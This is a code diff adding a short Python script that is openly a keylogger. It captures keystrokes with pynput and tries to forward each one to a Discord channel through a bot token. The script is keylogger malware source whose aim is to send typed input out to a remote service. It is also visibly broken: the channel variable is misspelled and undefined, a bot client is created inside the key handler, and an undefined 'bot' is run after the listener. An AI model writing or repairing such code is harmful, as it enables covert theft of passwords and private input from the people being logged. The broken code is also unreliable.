@@ -1,0 +1,44 @@
+from pynput import keyboard
+import discord
+from discord.ext import commands
+HANNEL_ID = abx
+
+def on_key_press(key):
+    try:
+        print(f' {key.char} ')
+        MESSAGE = key.char
+        intents = discord.Intents.default()
+        intents.message_content = True
+        client = commands.Bot(
+             command_prefix=commands.when_mentioned,
+            help_command=None,
+            AllowedMentions=discord.AllowedMentions.none(),
+            intents=intents
+        
+        )
+    except AttributeError:
+        
+        print(f'Special key {key} pressed')
+    
+
+    @client.event
+    async def on_ready():
+        global CHANNEL_ID, MESSAGE
+        channel = client.get_channel(CHANNEL_ID)
+        await channel.send(MESSAGE)
+           
+           
+           
+           
+
+ 
+
+def on_key_release(key):
+    # You can add additional functionality here if needed
+    pass
+
+
+with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
+    listener.join()
+
+bot.run('your token')
